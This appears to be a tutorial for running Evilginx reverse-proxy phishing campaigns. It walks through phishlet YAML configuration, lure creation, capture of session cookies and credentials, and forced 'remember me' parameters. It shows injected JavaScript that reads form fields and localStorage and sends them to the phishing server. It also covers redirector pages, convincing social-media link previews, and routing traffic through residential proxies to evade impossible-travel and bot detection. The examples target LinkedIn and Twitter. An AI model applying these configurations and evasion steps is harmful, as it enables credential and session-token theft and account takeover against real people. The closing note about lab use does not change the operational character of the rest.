## Phishlet
A phishlet is essentially a YAML configuration file  that tells a reverse-proxy phishing tool  such as Evilginx  how to impersonate a specific website. It defines how the proxy should interact with the legitimate site, what content to load, what data to capture, and how to forward traffic back and forth between the victim and the real service without raising suspicion.

1. **Target domain and subdomains**
2. **Which pages to proxy** (e.g., `/login`, `/auth`)
3. **Which resources should be rewritten** (JS, CSS, images)
4. **Session/cookie rules** — which tokens should be captured
5. **Authentication flow logic**
6. **Custom behaviors**, e.g., blocking non-browser bots


## Configuration
- Configure the base domain. this will be our base phishing Domain
	```
	config domain <domain_name> 
	```
- Configure IP address of the evilgnix server
	```
	config ipv4 <ip>
	```
- Configure the phishing hostname. This is where phishing URL will be hosted. This will asssign specific phislet to a specific URL or subdomain.   The hostname should end with the phishing domain. since this is where we will host the phishing page . the base domain dosent have to do anything with it.
	```
	phishlets hostname <phishlet> <domainending with the phishing_domain>
	```
- Enable the phishlet
	```
	phishlets enable <phishlet>
	```
- create Lure aka  Phishing link
	```
	lure create <phishlet>
	```
- generate the url link
	```
	lure get-url <lure-id>
	```
- create a lure with custom path
	```
	lure edit <id_of_lure> path <convinving_path> 
	```
- create a lure with custom hostname but it will end with our base phishing domain
	```
	lure edit <id_of_lure> hostname <convinving_hostname> 
	```
- configure an redirect url which will redirect the user after  all the session token are stolen to keep the rhythm
	```
	lure edit <id_0f_lure> redirect_url <custom_url_to_redirect>
	```
- custom parameters are dynamic variables embedded in the phishing URL to personalize the lure for each victim. They can be used in pre-phish HTML templates or injected JavaScript to customize content like the target's name or email, making the attack more convincing
	```
	lures get-url <id> param1=value1 param2="value2 with spaces"
	```

## proxy_hosts
proxy_hosts tells the framework which upstream website hosts are involved and how those hosts are represented in the proxy configuration. It is different from the lures or URLs used to direct a visitor to a phishing page

- `phish_sub` : The proxy-side subdomain label. This identifies the subdomain label used on the proxy's configured domain. It is not the legitimate website's original hostname.

- `orig_sub` : The original website's subdomain that we are trying to proxy . This identifies the subdomain of the legitimate host being referenced. For example, in login.example.com, the subdomain is login. If the hostname is just example.com, there is no subdomain label before the base domain.

- `domain` : The legitimate host's base domain. This identifies the domain portion used with orig_sub to describe the upstream hostname. For example, the parts login and example.com combine to form login.example.com. The exact hostname depends on the real service and its configuration.

- `session` : A Boolean: true or false. Setting this to true for specific host will make sure that this host's responses will contain session cookies, credentials and other data worth capturing. If it is a host serving static content (e.g. javascript), you can safely set this parameter to false. It does not mean the website requires a login, and it is not the same as enabling a browser session. A static-content host and a host serving the main application may have different roles.

- `is_landing` : A Boolean: true or false . This marks which configured proxy host is used as the landing host when generating a lure URL.

    - true: identifies the landing host.
    - false: the host is not designated as the landing host.

- `auto_filter` : A Boolean: true or false. This controls automatic generation of content-replacement rules for the host.whether Evilginx automatically attempts to create the required sub_filters for a host. A website may include references to other hostnames in its HTML or 			   JavaScript. When traffic is proxied, those references can affect whether pages and resources work correctly. A sub-filter is a rule used to modify matching text in proxied responses.

    - true: allows automatic generation of applicable replacement rules.
    - false: disables that automatic behavior for the host.


```
proxy_hosts:
  - {phish_sub: '', orig_sub: '', domain: 'twitter.com', session: true, is_landing: true}
  - {phish_sub: 'abs', orig_sub: 'abs', domain: 'twimg.com', session: false, is_landing: false}
  - {phish_sub: 'api', orig_sub: 'api', domain: 'twitter.com', session: false, is_landing: false}
```

## sub_filter

Evilginx uses `auto_filter` (in older versions, this was done using Nginx's `sub_filter`) to automatically identify and replace content in the proxied response. This ensures that links pointing back to the legitimate site are rewritten to point to the phishing server, preventing the user from escaping the attack flow.

Sub_filters in Evilginx are configuration rules in a phishlet that search for specific text within HTTP responses from a proxied website and replace matching text with a specified value before the response is delivered to the browser. They can be used to rewrite hostnames, URLs, or other text in supported response content types, helping the proxied website's resources and links function under the configured proxy hostnames.

Key parameters for `sub_filters` include:

- `triggers_on`: The original hostname where the filter should be applied.
- `orig_sub` : Specifies the original subdomain component associated with the legitimate hostname referenced by the filter.
- `domain` : Specifies the main domain component of the legitimate hostname associated with the rule.
- `search`: The regular expression to search for in the response body.
- `replace`: The string that will replace all occurrences matching the search expression.
- `mimes`: An array of MIME types (e.g., `text/html`, `application/json`) for which the filter will trigger.


You can use the following auto-fill variables in both search and replace fields:

- `{hostname}`: When used in search field, it will become a hostname from combination of orig_sub and domain, defined in same sub_filter entry. When used in replace field, the combined hostname will be auto-translated to corresponding phishing hostname, by looking up the configured entries in proxy_hosts section. This is useful for replacing all occurences of website's original hostname with the phishing one in responses.
- `{subdomain}`: Works the same way as {hostname}, but only refers to the subdomain defined in orig_sub field.
- `{domain}`: Works the same way as {hostname}, but only refers to the domain defined in domain field.
- `{hostname_regexp}`: Equivalent of {hostname}, but each auto-translated string is properly escaped for use inside regular expressions. Needed sometimes for bypassing anti-phishing protections involving regular expressions.
- `{subdomain_regexp}`: Equivalent of {subdomain}, but each auto-translated string is properly escaped for use inside regular expressions. Needed sometimes for bypassing anti-phishing protections involving regular expressions.
- `{domain_regexp}`: Equivalent of {domain}, but each auto-translated string is properly escaped for use inside regular expressions. Needed sometimes for bypassing anti-phishing protections involving regular expressions.




```
sub_filters:
  - triggers_on: "www.linkedin.com"
    search: 'action="https://www\\.linkedin\\.com'
    replace: 'action="https://www.totally.not.fake.linkedin.our-phishing-domain.com'
    mimes: [ "text/html" ]

```

## auth_tokens

The auth_tokens section specifies which cookies are need to be captured. When a user logs in to a website, the website may store cookies in the browser to remember that the user is authenticated. Evilginx checks for the configured cookies in the website's responses and uses them to determine when its session-capture process is complete. Once the configured conditions are met, it records the event and redirects the user to the destination URL provided in the original link.

- `domain` : Specifies the domain associated with the cookies in that entry.
- `keys` : Exact name of the cookie that will be searched for and captured. Available modifiers for each key are `regexp` and `opt`
- `regexp` : Treats cookie name as a regular expression. For example key 'frog-[0-9]{3},regexp' will look for any key like frog-283, frog-111, frog-291 to capture. IMPORTANT! If you use at least one regexp modified key, make sure to trigger session capture with auth_urls (explained below).
- `opt` : Treats that cookie as optional. If that cookie arrives, it will be captured, but if it doesn't and other required cookies have already been captured, the session will be considered finished.

```
auth_tokens:
  - domain: '.company.com'
    keys: ['session','_visit','id']
  - domain: 'auth.company.com'
    keys: ['sid','ver,opt']
```

## auth_urls

By default Evilginx will consider the session as authenticated when all cookies defined in auth_tokens section are captured. The exception is when the names of the cookies, you need to capture, are generated dynamically. In such scenario you need to use regular expressions to search for session cookies or just capture all of them. Evilginx will then not know when all of the session cookies have been captured and will need an alternative way to trigger the successful session capture.

Session will be considered captured when request to any of the defined URL paths is made. These URL paths should only be accessible after the user has successfully authenticated, thus indicating the authentication was successful.

```
auth_urls:
  - '/admin'
  - '/admin/.*'
```
When user is redirected to https://phishdomain.com/admin, https://phishdomain.com/admin/profile or https://phishdomain.com/admin/settings, session capture will be considered successful.

## Credentials
The credentials section in an Evilginx phishlet defines the form fields that the software identifies as usernames, passwords, and other submitted data. It specifies the parameter name to look for, the pattern used to match its value, and the type of request in which the field appears and which POST arguments should be captured and which of them are user credentials.

```
credentials:
  username:
    key: 'email'
    search: 'PATTERN'
    type: 'post'
```

```
credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
  custom:
    - key: 'token'
      search: '(.*)'
      type: 'post'
    - key: 'pin'
      search: '([0-9]*)'
      type: 'post'
```


## OpenGraph Setup
If we are phishing using social media like discord or Microsoft fteams  when we post a link we will see a text/ title and an image of the embedded link. we can see them how they look like in [Opengraph.xyz](https://opengraph.xyz) site.

- configure the title preview
	```
	lure edit <id_0f_lure> og_title  <custom_title>
	```
- Configure the image preview
	```
	lure edit <id_0f_lure> og_image  <image_link>
	```





## Forcing Post Parameters
You can force POST parameters using the **`force_post`** section within a phishlet's YAML configuration file. This feature allows you to add or replace specific POST arguments in intercepted requests, which is useful for actions such as enabling a "Remember Me" option during authentication, even if the user did not select it

```
force_post:
  - path: '/path/to/specific/endpoint' # Regular expression to match the URL path
    search: # Trigger POST arguments (all must be present for the force to apply)
      - {key: 'arg_key_1', search: 'regexp_to_match_value_1'}
      - {key: 'arg_key_2', search: 'regexp_to_match_value_2'}
    force: # List of POST arguments to insert or replace
      - {key: 'new_arg_key', value: 'new_arg_value'}
      - {key: 'remember_me', value: 'on'} # Example: Force "Remember Me"
    type: 'post' # Currently, only 'post' is supported for this section

```

### Handling JSON and Local Storage
You can configure Evilginx to look for and capture specific parameters within a JSON payload sent in a POST request. This is done in the `credentials` or `auth_tokens` sections of the phishlet.
```
credentials:
  - key: "username"
    type: json
    search: '"username":"([^"]+)"'
```

Directly accessing a user's local storage from the server side is not possible. Evilginx works around this limitation by injecting custom JavaScript into the proxied web pages. 

- **JavaScript Injection:** You inject client-side JavaScript that interacts with the `localStorage` API. This script can:
    - Retrieve items from local storage using `localStorage.getItem('key')`.
    - Parse the retrieved JSON strings into objects using `JSON.parse()`.
    - Exfiltrate this data to the Evilginx server, typically by making a separate background request (e.g., an HTTP long poll or a specific fetch request) to a controlled endpoint on the phishing domain.

## JavaScript Injection

Attackers define the JavaScript to be injected within the `js_inject` section of a phishlet configuration file. This configuration specifies conditions like `trigger_domains`, `trigger_paths`, and `trigger_params` to control exactly when and where the script is inserted into the proxied web pages.**JavaScript is injected** into the page before it reaches the victim’s browser.
- JS executes in the victim’s browser:
    - Reads form inputs (username/password)
    - Accesses `window.localStorage` or cookies
    - Sends data back to Evilginx server
```
js_inject:
  - trigger_domains: ["www.linkedin.com"]
    trigger_paths: ["/uas/login"]
    # This injection only runs if the 'email' parameter is configured in the lure
    trigger_params: ["email"] 
    script: |
      function lp() {
        var email = document.querySelector("#username");
        var password = document.querySelector("#password");
        if (email != null && password != null) {
          // '{email}' is a placeholder replaced by Evilginx with the target's email
          email.value = "{email}"; 
          password.focus();
          return;
        }
        setTimeout(function(){lp();}, 100);
      }
      setTimeout(function(){lp();}, 100);
```

## Landing page Redirector 
Redirectors are little websites, acting as a landing pages to your phishing links. When anyone clicks on your generated phishing link, they will land on the redirector website. This website should redirect the visitor to the reverse proxied phishing sign-in page, either automatically or by requiring some user interaction.

To create a redirector, navigate to the `evilginx/redirectors` directory and create a new folder (e.g., `AntiBotScan`).

Inside this folder, you can create an `index.html` file and embed JavaScript to control the redirection. Here’s a simple example that redirects the user after 2 seconds:

```html
<!DOCTYPE html>
<script>
    document.write(`<meta http-equiv="Refresh" content="2; url=` + {lure_url_js} + `">`);
</script>
<html>
<head>
    <title>Loading...</title>
</html>
```

In evilginx interface, simply type:

```html
lures edit <lure_id> redirector /root/redirectors/nothingredirect/index.html
```

## Proxying the Reverse proxy
Configuring the Evilginx server to forward all its traffic to the legitimate target through another proxy server (e.g., a commercial VPN or a residential proxy network). This changes the source IP address that the target organization's logs will see, making it harder to flag based on IP reputation or location anomalies (e.g., "impossible travel" detection).
The Evilginx Pro version includes a "Botguard" feature that detects automated scanners or bots and serves them a decoy website

```
proxy address <ip>
proxy port <port_number>
```

#### BlackList Management
When a user visits our phishing Domain with a broken link or with missing parameters we can redirect them to a fake website
```
~/.evilginx/blacklist.txt
```


## Security validation

### Location Validation
Location validation on websites is the process of verifying a user's or a given address's actual location to ensure it is accurate and matches what is provided. Location validation is primarily a part of its **Botguard** feature, which is designed to identify and block automated scanners and security products from accessing the phishing website

### Secret Token Validation
Secret token validation is a mechanism used to manage and verify user sessions safely. When someone clicks a link (called a “lure”) in a controlled lab environment, Evilginx generates a unique secret token for that session. This token is included in the URL, cookies, or hidden form fields. Whenever the user interacts with the page or submits credentials, Evilginx checks whether the token matches the one it generated for that session. If the token is valid, the session continues and data is processed (for testing purposes); if it is missing or invalid, the request is rejected. This system prevents unauthorized or accidental access to the server, ensures sessions are properly tracked, and protects against session hijacking or replay attacks. Essentially, the token acts like a “guest pass” that only allows legitimate sessions to proceed, and it is meant to be used ethically in labs or penetration tests on systems you control.
